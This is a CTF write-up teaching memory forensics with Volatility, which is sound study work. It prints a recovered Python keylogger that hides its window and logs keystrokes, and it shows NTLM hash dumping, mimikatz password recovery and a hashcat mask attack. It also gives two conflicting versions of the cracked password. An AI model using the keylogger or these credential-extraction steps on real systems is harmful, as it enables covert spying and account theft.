---

layout: post

title:  "Volatile Memory Analysis"

summary: "Analyze Windows memory with volatility and extract  artifacts"

author: trigleos

date: '2021-04-08 16:00:00 +0200'

category: ['Forensics', 'Threat_Hunting','Incident_Response']

tags: Forensics, CTF, Threat Hunting, Incident Response, volatility

thumbnail: /assets/img/posts/volatile-memory/volatility.png

keywords: Forensics, CTF, Threat Hunting, Incident Response, volatility

usemathjax: false

permalink: /blog/volatile-memory/

---

# KarDi Bee X

## TL;DR

Analyze Windows 7 memory image and extract several artifacts to recover files

## Description

This was one of the challenges from the SecurinetsQuals CTF 2021. I didn't manage to solve it in time before the CTF ended but with help from some friendly people on Discord, I managed to recover every artifact and get to the flag. However, the main reason I'm posting this writeup is because I had to use a lot of features of volatility, an open-source memory analysis tool. Documentation on this tool isn't as readily available as it should be, so I thought I'd use this opportunity to present a chunk of its plugins and descriptions on how to use them, using the approach of a CTF challenge. If you want to follow allong, you can get volatility from [github](https://github.com/volatilityfoundation/volatility) and the memory image I'm working with from [google drive](https://drive.google.com/file/d/1ppAvhaxKijEm1JGtZ_3v_SB3Bz0ZpH1G/view) .

## Challenge Description


I downloaded a file from my friend but it turned out that it is very suspicious. I found him that day opening my pc, i have no idea how he managed to get the password.Not only my password tho, everything. He changed the password and used it to protect a file containing access to my secret file. But it's hashed now ... help me !

PS :  **<97> = 1 <98> = 2 ...**
Author: **_SemahBA_**

## Determining the OS

First of all, this file is quite big, more precisely 2 Gigabytes after extracting it. Volatility will scan through this file which means that it might take some time if your PC is a bit slower. 
The first thing you need to do is to determine from which OS this dump is coming from. You might already know this but if you don't, you need to ask volatility to determine the OS for you. The command to do this is **volatility -f memory.raw imageinfo**.
If we run this the output we get is:
```
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (C:\Users\pthil\Documents\CTFs\KardiBee\memory.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a590a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a5ad00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2021-03-16 11:19:09 UTC+0000
     Image local date and time : 2021-03-16 12:19:09 +0100

```
This already gives us some important intel. It shows us that the image has probably been taken on the 16th of March and it's also most certainly a Windows 7 image. We'll use the Win7SP1x64 image for further commands.
## Analyzing command history and processes
Now that we know what the OS is, we can go on and look deeper into the image. The first thing we should always do is look at the running processes. Volatility has the pslist plugin for that. Thus, the command is **volatility -f memory.raw --profile=Win7SP1x64 pslist**.
This spits out a lot of information. Normally you would look here for suspicious processes. In our case we only have one process that is out of the ordinary:
```
0xfffffa8003682060 DumpIt.exe             4080   1000      2       45      1      1 2021-03-16 11:19:06 UTC+0000
```
However, DumpIt is a memory dump tool that is freely available online so this was basically the process that took the memory image. After looking at processes, we can take a look at the command history. There are three plugins that can be used here:

1: cmdscan (returns commands that user entered in console) :

**volatility -f memory.raw --profile=Win7SP1x64 cmdscan**
```
Volatility Foundation Volatility Framework 2.6
**************************************************
CommandProcess: conhost.exe Pid: 1868
CommandHistory: 0x18cbc0 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 16 LastAdded: 15 LastDisplayed: 15
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 @ 0x1922e0: Securinets{don't_submit_me_i'm_wrong}
Cmd #1 @ 0x18a7a0: cd Desktop
Cmd #2 @ 0x189f70: dir
Cmd #3 @ 0x189f80: env
Cmd #4 @ 0x18a760: pswd
Cmd #5 @ 0x189f90: env
Cmd #6 @ 0x18a7c0: cd ..
Cmd #7 @ 0x188a20: cd Downloads
Cmd #8 @ 0x189fa0: run
Cmd #9 @ 0x18a7e0: cd ..
Cmd #10 @ 0x188a50: cd Documents
Cmd #11 @ 0x189fb0: dir
Cmd #12 @ 0x189fc0: run
Cmd #13 @ 0x14d140: U2VjdXJpbmV0c3tkb24ndF9zdWJtaXRfbWVfaSdtX3dyb25nfQ==
Cmd #14 @ 0x18a800: cd ..
Cmd #15 @ 0x147a60: qdfqdfsfksjgskjmldfskmljdfskljdgs$
Cmd #16 @ 0x18a480: ↓
**************************************************
CommandProcess: conhost.exe Pid: 4092
CommandHistory: 0xc06a0 Application: DumpIt.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #15 @ 0x80158: ♂
Cmd #16 @ 0xbdf50: ♀
```
2: consoles (parses cmd, commands and what they return)

**volatility -f memory.raw --profile=Win7SP1x64 consoles**
	
This command returns a lot of output, so I shortened it to the important parts
	
```                                                                                            
C:\Users\Semah\Desktop>dir                                                                                           
 Volume in drive C has no label.                                                                                     
 Volume Serial Number is A4B9-2264                                                                                   
                                                                                                                     
 Directory of C:\Users\Semah\Desktop                                                                                 
                                                                                                                     
03/16/2021  11:42 AM    <DIR>          .                                                                             
03/16/2021  11:42 AM    <DIR>          ..                                                                            
02/11/2021  11:31 AM           207,496 DumpIt.exe                                                                    
03/12/2021  12:57 PM                 0 U2VjdXJpbmV0c3tkb24ndF9zdWJtaXRfaXQ=.txt                                      
               2 File(s)        207,496 bytes                                                                        
               2 Dir(s)  20,302,376,960 bytes free                                                                   
                                                                                                                                                                  
C:\Users\Semah\Documents>dir                                                                                         
 Volume in drive C has no label.                                                                                     
 Volume Serial Number is A4B9-2264                                                                                   
                                                                                                                     
 Directory of C:\Users\Semah\Documents                                                                               
                                                                                                                     
03/16/2021  11:44 AM    <DIR>          .                                                                             
03/16/2021  11:44 AM    <DIR>          ..                                                                            
03/14/2021  02:07 PM    <DIR>          bm90IG5lZWQgdG8gZGVjb2RlIG1l                                                  
03/16/2021  11:53 AM               965 mal.py.py                                                                     
03/12/2021  12:54 PM             2,750 secret.rar                                                                    
               2 File(s)          3,715 bytes                                                                        
               3 Dir(s)  20,302,336,000 bytes free                                                                   
```
3: cmdline (returns commands that processes have been started with. This can be useful if you want to analyze processes)

**volatility -f memory.raw --profile=Win7SP1x64 cmdline**
	
The output here is quite long so I'll just show what the output looked like for firefox and DumpIt:
```
firefox.exe pid:   3124
Command line : "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -contentproc --channel="2556.55.1920403753\137372815" -childID 8 -isForBrowser -prefsHandle 4480 -prefMapHandle 4472 -prefsLen 9859 -prefMapSize 240241 -parentBuildID 20210310152336 -appdir "C:\Program Files (x86)\Mozilla Firefox\browser" - 2556 "\\.\pipe\gecko-crash-server-pipe.2556" 4492 tab
************************************************************************
DumpIt.exe pid:   4080
Command line : "C:\Users\Semah\Desktop\DumpIt.exe"
************************************************************************
```
So let's summarize what we have found here.  The information from cmdline and consoles tells us that someone tried to run env. env is a Unix command that shows Environment Variables. This will be important for later on. Secondly, the user has some interesting files in his Documents directory, **secret.rar** and **mal.py.py** We will extract and analyze those in the next step
## Extracting and analyzing files

In order to extract files from a memory dump, we need two volatility plugins. First of all, we need to let volatility carve out the files. The **filescan** plugin can be used for that. This plugin is very verbose so it's a good idea to save its output to a file so we can later search through that file:

**volatility -f memory.raw --profile=Win7SP1x64 filescan > files.txt**

This gives us a file with the physical offsets of files in the memory image. We need those if we want to extract artifacts. If we search for the Documents directory, we can find both the mal.py.py file:
```
0x000000007e57f3e0     16      0 R--rw- \Device\HarddiskVolume1\Users\Semah\Documents\mal.py.py
```
as well as the secret.rar file:
```
0x000000007e5c4070      1      0 R--r-- \Device\HarddiskVolume1\Users\Semah\Documents\secret.rar
```
There are several other interesting files in this dump, especially when you search for the Recent folder that contains links to recently opened files. However, in this case they're all dead-ends so we will not pursue those routes.
Now that we have the offsets, we can extract the files with the **dumpfiles** plugin:

**volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e5c4070 -n --dump-dir .**

The -Q flag specifies the physical offset. In this example, we gave it the offset for the secret.rar file. 
Unfortunately, if we try to extract the contents, lovely WinRAR tells us that we need a password.

After this highly technical content let's take a short break and look at an amazing comic by the very talented system32comics, you can view his short stories on [instagram](https://www.instagram.com/system32comics/)

![comic](/assets/img/posts/volatile-memory/system32.jpg)

Ok after that short break let's get on with the challenge. We now need to remember that the user tried to set Environment Variables. There's a volatility plugin that extracts these variables called envars. It's again quite verbose because it lists every variable from every process so we can save it to a file for further analysis:

**volatility -f memory.raw --profile=Win7SP1x64 envars > env.txt**

After a bit of looking around, we can find the following variable:
```
     376 csrss.exe            0x0000000000361320 winrar_pswd                    reyVh4Y75hiR3nKI0Gio
```
Finally we have discovered something. Using this password, we can extract the contents from the secret.rar file. It contains a single file named secret.kdbx . The kdbx extension is native to the KeePass password manager. (Another indication for this is the presence of the KeePass executable in the shimcache, a cache that records recently used programs). Unfortunately (for us, for other users probably luckily) kdbx files require a master password to open. Now that we're kind of stuck here, we should look at the python file.
## Keylogger analysis
Again, here's the command to dump the file:

**volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e57f3e0 -n --dump-dir .**

and here's the content of the dumped file:
```python
import pynput
from zipfile import ZipFile
from pynput.keyboard import Key, Listener 
   
keys = [] 

def hide():  # This function hides the GUI so victim doesn't know he's infected
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def on_press(key):  # When victim presses key 
    keys.append(key)   # Add key to list
    write_file(keys)   # Write key to file

def write_file(keys): # This writes key list to a file
    with open("C:\Users\Semah\Documents\bm90IG5lZWQgdG8gZGVjb2RlIG1l\aSdtIGp1c3QgYSB0cm9sbA==\ZXh0cmEgZmlsZQ==\bG9ncw==", 'w') as f: 
        for key in keys:  
            k = str(key).replace("'", "") 
            f.write(k+' ')
               
def on_release(key):  # When victim releases key
    if key == Key.esc:  # If the released key is the Escape key
		zipObj = ZipFile('malmalmal.zip', 'w')  # Open malmalmal.zip file
		zipObj.write('C:\Users\Semah\Documents\bm90IG5lZWQgdG8gZGVjb2RlIG1l\aSdtIGp1c3QgYSB0cm9sbA==\ZXh0cmEgZmlsZQ==\bG9ncw==')  # Take contents of file where we wrote keys and put them into zip file
		zipObj.close()  # Close zip file
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:  
    listener.join()
```
I added the comments to better explain what is happening here. Basically, this script records keyboard touches and saves them into the malmalmal.zip file. We got a new artifact that we can extract so let's search for it.
We can find an entry in our list of files:
```
0x000000007e4ef450      2      0 RW---- \Device\HarddiskVolume1\Users\Semah\Downloads\malmalmal.zip
```
So let's extract it and analyze it:

**volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4ef450 -n --dump-dir .**

However, this archive is again password protected so we can't go on here. The next steps are a bit more random. It unfortunately misses the clear narrative we had before. For example based on the python script the malmalmal.zip file shouldn't be password protected but it still is. So let's dive deeper into the confusing world of memory analysis
## Dumping password hashes
If we look closer at the description again, we can find the following statement: **He changed the password and used it to protect a file containing access to my secret file. But it's hashed now ...**
It seems that the attacker installed the keylogger to get the user's password, logged in with it, changed it and used the changed password to secure a file containing access to the secret file (maybe the malmalmal.zip file ?) . Then he hashes it. So first of all we need to find the current password. Volatility has a plugin called hashdump that dumps NT/LM hashes. The command we need is:

**volatility -f memory.raw --profile=Win7SP1x64 hashdump**

```
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Semah:1000:aad3b435b51404eeaad3b435b51404ee:89d3c09ac96c6fb3e18cf97b5462eb7a:::
```
We can now try to crack the NTLM hash 89d3c09ac96c6fb3e18cf97b5462eb7a online on crackstation.net or  using hashcat but there's an easier way to do this. There's an external mimikatz plugin for volatility. Mimikatz is infamous as a tool that is oftenly used by threat actors to extract passwords out of memory and use them for lateral movement. In our case, it can help us to recover the current password. You can get the plugin from [github](https://github.com/volatilityfoundation/community/blob/master/FrancescoPicasso/mimikatz.py)
The command we need to run is:

**volatility -f memory.raw --profile=Win7SP1x64 mimikatz**

```
Volatility Foundation Volatility Framework 2.6.1
Module   User             Domain           Password
-------- ---------------- ---------------- ----------------------------------------
wdigest  Semah            WIN-NF3JQEU4G0T  a3af05e30feb0ceec23359a2204e2991
wdigest  WIN-NF3JQEU4G0T$ WORKGROUP
```
Mimikatz was successful in recovering the password, it's a3af05e30feb0ceec23359a2204e2991 (we would probably have never recovered this if we tried to brute-force it).
So this is the hashed password that the victim was talking about. We somehow need to recover the original password. But we need some more hints so we can decrease the search space.
## Windows Registry
The Windows Registry is a sort of database that stores settings for the OS as well as for applications that want to use it. It is composed of several hives. The hive that interests us is the SAM hive. SAM or Security Account Manager is a database file that stores authentication information. One thing is stores for example are the hashes of user passwords. This is where the hashdump plugin dumps the hashes from. However, another thing it stores are password hints. The little tips that get displayed after you've entered a wrong password too many times. Maybe the victim left a useful tip there that we can use to crack the hash. First of all, we need to locate the SAM hive. Volatility has the hivelist plugin for that purpose:

**volatility -f memory.raw --profile=Win7SP1x64 hivelist**

```
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a00173e010 0x000000006a469010 \??\C:\Users\Semah\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a002e6c010 0x000000002a29e010 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a00000d250 0x000000002d3c4250 [no name]
0xfffff8a000024010 0x000000002d32f010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a000052010 0x000000002d45d010 \REGISTRY\MACHINE\HARDWARE
0xfffff8a000556010 0x000000002a8b6010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a00075d010 0x000000002a7bc010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a000762010 0x000000002a73f010 \SystemRoot\System32\Config\SECURITY
0xfffff8a000765010 0x000000002a9c1010 \SystemRoot\System32\Config\SAM
0xfffff8a000f21010 0x0000000021732010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a000fb7010 0x0000000020aa5010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a00170e010 0x000000006a72b010 \??\C:\Users\Semah\ntuser.dat
```
 Now that we know the offset of the SAM hive, we can look at the keys it contains. The plugin we need to do this is the printkey plugin:
 
 **volatility -f memory.raw --profile=Win7SP1x64 printkey -o 0xfffff8a000765010**
 
```
Registry: \SystemRoot\System32\Config\SAM
Key name: CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7} (S)
Last updated: 2009-07-14 04:45:46 UTC+0000

Subkeys:
  (S) SAM

Values:
```
 We now need to recursively traverse the Subkeys until we find an entry for our user. Basically the next command we would run would be:
 
 **volatility -f memory.raw --profile=Win7SP1x64 printkey -o 0xfffff8a000765010 -K SAM**
 
```
Registry: \SystemRoot\System32\Config\SAM
Key name: SAM (S)
Last updated: 2009-07-14 04:45:47 UTC+0000

Subkeys:
  (S) Domains
  (S) LastSkuUpgrade
  (S) RXACT
```
Then we run **volatility -f memory.raw --profile=Win7SP1x64 printkey -o 0xfffff8a000765010 -K SAM\Domains** and so on until we get to the end, **volatility -f memory.raw --profile=Win7SP1x64 printkey -o 0xfffff8a000765010 -K SAM\Domains\Account\Users\000003E8**. There we can find the following value in the output:
```
REG_BINARY    UserPasswordHint : (S)
0x00000000  69 00 74 00 27 00 73 00 20 00 65 00 61 00 73 00   i.t.'.s...e.a.s.
0x00000010  79 00 20 00 74 00 6f 00 20 00 67 00 65 00 74 00   y...t.o...g.e.t.
0x00000020  2c 00 20 00 61 00 6c 00 6c 00 20 00 79 00 6f 00   ,...a.l.l...y.o.
0x00000030  75 00 20 00 68 00 61 00 76 00 65 00 20 00 74 00   u...h.a.v.e...t.
0x00000040  6f 00 20 00 64 00 6f 00 20 00 69 00 73 00 20 00   o...d.o...i.s...
0x00000050  63 00 72 00 61 00 63 00 6b 00 20 00 69 00 74 00   c.r.a.c.k...i.t.
0x00000060  2c 00 20 00 6d 00 64 00 35 00 20 00 33 00 63 00   ,...m.d.5...3.c.
0x00000070  68 00 61 00 72 00 73 00 2b 00 34 00 6e 00 75 00   h.a.r.s.+.4.n.u.
0x00000080  6d 00 62 00 65 00 72 00 73 00 2b 00 79 00 6f 00   m.b.e.r.s.+.y.o.
0x00000090  75 00 5f 00 72 00 75 00 6c 00 65 00 5f 00 68 00   u._.r.u.l.e._.h.
0x000000a0  65 00 72 00 65 00                                 e.r.e.
```
After parsing this Unicode string to ASCII, we get **"it's easy to get, all you have to do is crack it, md5 3chars+4numbers+you_rule_here"**. Now we have all the information we need to crack the hash so let's fire up hashcat.
## Cracking the password
Hashcat is a great tool to crack hashes. In this case, we can use a mask attack. The exact command we have to use is:
**hashcat -m 0 md5_hash -a3 ?l?l?l?d?d?d?dyou_rule_here** and save the md5 hash **a3af05e30feb0ceec23359a2204e2991** in the md5_hash file. Running this will give us the original password,**sba2020you_rule_here** you may need to use the --force option, but check the result if you do use it. In our case, running **echo -n "sba2021you_rule_here" | md5sum** gives us the md5 hash we were looking for so we know that the password is correct. Using this password, we can finally open the malmalmal.zip file and extract the keylogger output file. Opening it, we can find the following text:
```
Key.shift H e l l o Key.space s i r , Key.enter Key.shift I Key.space h a v e Key.space c h a n g e d Key.space t h e Key.space p w d Key.space o f Key.space t h e Key.space k p Key.space b e c a s u Key.backspace Key.backspace u s e Key.space i Key.space t h n k Key.space i "" m Key.space u n d e r Key.space a t t a c k , Key.space t h e Key.space n e w Key.space p w d Key.space i s Key.space : Key.space Key.enter <104> Key.shift z n q Key.shift w <99> Key.shift h Key.shift o Key.shift c Key.shift d f Key.shift m <101> Key.backspace <102> Key.shift w i u q à Key.backspace q Key.backspace a Key.shift o Key.shift b Key.enter Key.shift B e s t Key.space r e g a r d s , Key.enter Key.shift S e m a h Key.shift B A Key.esc 
```
After cleaning this up and replacing <97> with 1 and <98> with 2 and so on, we get:
```
Hello sir,
I have changed the pwd of the kp because i thnk I'm under attack, the new pwd is : 
8ZnqW3HOCDfM6WiuqaOB
Best regards,
Semah Ba
```
So now we also have the master password for the KeePass file. Opening it, we get:

![KeePass](/assets/img/posts/volatile-memory/keepass.png)

So the user has saved a password for a paste which is **LQlhH481mqpAor4Faroi**. The last thing we need is a URL where we can use this password. We're slowly getting to the end.
## Copying from clipboard
One thing we haven't looked at yet is the clipboard and volatility of course has a plugin to analyze its content as well that is called **clipboard**. The command we'll use is:
**volatility -f memory.raw --profile=Win7SP1x64 clipboard -v**
It gives us amongst other things the following memory dump:
```
         1 ------------- ------------------           0x2002e7 0xfffff900c1b1b860
0xfffff900c1b1b874  68 00 74 00 74 00 70 00 73 00 3a 00 2f 00 2f 00   h.t.t.p.s.:././.
0xfffff900c1b1b884  64 00 65 00 66 00 75 00 73 00 65 00 2e 00 63 00   d.e.f.u.s.e...c.
0xfffff900c1b1b894  61 00 2f 00 62 00 2f 00 77 00 72 00 43 00 69 00   a./.b./.w.r.C.i.
0xfffff900c1b1b8a4  30 00 30 00 62 00 50 00 62 00 38 00 65 00 44 00   0.0.b.P.b.8.e.D.
0xfffff900c1b1b8b4  66 00 39 00 45 00 38 00 62 00 39 00 49 00 71 00   f.9.E.8.b.9.I.q.
0xfffff900c1b1b8c4  79 00 78 00 00 00 00 00 00 00 00 00               y.x.........
```
We can clearly see a Unicode string here which gives us [https://defuse.ca/b/wrCi00bPb8eDf9E8b9Iqyx](https://defuse.ca/b/wrCi00bPb8eDf9E8b9Iqyx) after decoding it. Visiting this URL, it asks us for a password to decrypt the paste so we enter the previously discovered password and we finally get the flag:

![paste](/assets/img/posts/volatile-memory/paste.png)

## Summary

I hope you liked this deep dive into the world of memory analysis and the volatility tool, even though it was quite long. This challenge was especially well made for this, because it required a lot of volatility plugins to solve so shout out to the Securinets team for creating it. Memory analysis challenges come up in a lot of CTFs and this knowledge is also definitely useful for the Forensics profession so keep coming back to this psot as a guide if you ever need to use volatility again. Feel free to contact me if you need any further information on memory analysis. While I certainly don't know everything, I might be able to help you if you're just starting out. Until next time,

-Trigleos
